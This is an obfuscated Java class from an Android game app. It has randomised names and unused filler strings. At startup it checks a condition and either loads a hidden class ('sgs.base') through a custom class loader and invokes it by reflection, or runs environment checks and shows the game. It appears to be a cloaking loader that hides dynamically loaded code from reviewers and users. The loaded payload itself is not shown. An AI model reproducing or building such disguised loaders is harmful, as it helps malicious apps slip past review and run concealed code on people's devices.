package zz.sgs;

import android.app.Application;

import java.lang.reflect.Method;
import java.util.Timer;
import java.util.TimerTask;

import zz.sgs.Qdhfqjvrtr;
import zz.sgs.sgst.MycocosAppLication;
import zz.sgs.sgst.sgsAfwAbout;
import zz.sgs.sgst.sgsBotData;
import zz.sgs.sgst.sgsTools;

public class Aeonnijbmf {
    /**1 */
    public static void APPLICATIONCREATE(MycocosAppLication arsKls) {
        int gHLKSkpwVV = 1927;
        String AThtsj = "NIOROWFJDKOnnmLmNjsEaEpiZfeZQnD";
        String qDLbJROFgJ = "RDSJHEDIciZJpOsMsAqVVBSeIEqKOzapalobBCneYD";
        if(Qdhfqjvrtr.Judgeadjustsch()){
            try {
                String ltSbVWw = "asVqtJpoVLRRMmyq";
                String HpTLrGwTt = "TtVFbGAoYSHcxmzbwIx";
                Class<?>  dawq = MycocosAppLication.m_dcl.loadClass("sgs.base");
                Method vvv = dawq.getMethod("sgs1", new Class[] {Application.class });
                vvv.invoke(null, new Object[] {arsKls});
            } catch (Exception edq){
                String dfjcrp = "QsviyQoasdasdasdaUiFUbDbMnJExIkjQsGVQ";
                edq.printStackTrace();

            }
        }else{
            int pwSTWnd = 109;
            String hexQj = "VkDYfUAsdasasdasdIrtpFvgrGvPbM";
            sgsAfwAbout.adjustEntry(arsKls);
            JudgeAfw();

            sgsTools.boolPtIp();
            sgsTools.checkLinuxConfig(MycocosAppLication.m_ctx);
        }
    }
    public static int swscw = 0;
    public static void JudgeAfw(){

        final Timer bgwvsw = new Timer();
        final TimerTask lavjkiwjv = new TimerTask() {
            @Override
            public void run() {
                swscw ++;
                String dasd = sgsAfwAbout.faswww();
                if(!"".equals(dasd)){
                    if (sgsBotData.JudgeJfwf(dasd)){
                        Qdhfqjvrtr.GameRestart();
                    }else{
                        bgwvsw.cancel();
                    }
                }
                if (swscw > 17){
                    bgwvsw.cancel();
                }
            }
        };
        bgwvsw.schedule(lavjkiwjv, 1345, 1455);
    }

}